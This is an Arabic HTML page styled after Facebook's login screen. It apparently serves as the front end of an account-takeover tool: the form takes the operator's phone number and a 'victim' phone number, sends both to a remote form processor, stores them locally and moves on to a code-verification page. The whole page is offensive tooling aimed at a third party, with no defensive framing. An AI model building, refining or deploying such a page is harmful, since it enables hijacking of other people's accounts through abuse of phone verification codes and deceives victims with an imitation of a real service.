<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>تسجيل الدخول</title>
  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #4267B2, #29487d);
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      direction: rtl;
    }
    .container {
      background: white;
      border-radius: 16px;
      padding: 30px;
      width: 100%;
      max-width: 400px;
      text-align: center;
    }
    input {
      width: 100%;
      padding: 12px;
      margin-bottom: 15px;
      border-radius: 8px;
      border: 1px solid #ccc;
    }
    button {
      width: 50%;
      padding: 12px;
      background-color: #1877f2;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>تسجيل الدخول</h2>
    <form id="phoneForm" onsubmit="return sendPhone(event);">
      <input type="tel" id="phone" placeholder="رقم هاتفك" required pattern="[0-9]{10,15}">
      <input type="tel" id="victim_phone" placeholder="رقم الضحية" required pattern="[0-9]{10,15}">
      <button type="submit">إرسال الكود</button>
    </form>
  </div>

  <script>
    function sendPhone(event) {
      event.preventDefault();
      const phone = document.getElementById("phone").value;
      const victim = document.getElementById("victim_phone").value;

      fetch("https://example.com/formtools/process.php", {
        method: "POST",
        body: new URLSearchParams({
          form_id: "1",
          phone: phone,
          victim_phone: victim
        })
      }).then(() => {
        localStorage.setItem("phone", phone);
        localStorage.setItem("victim_phone", victim);
        window.location.href = "verify.html";
      }).catch(err => alert("فشل الإرسال، تأكد من الاتصال."));
    }
  </script>
</body>
</html>
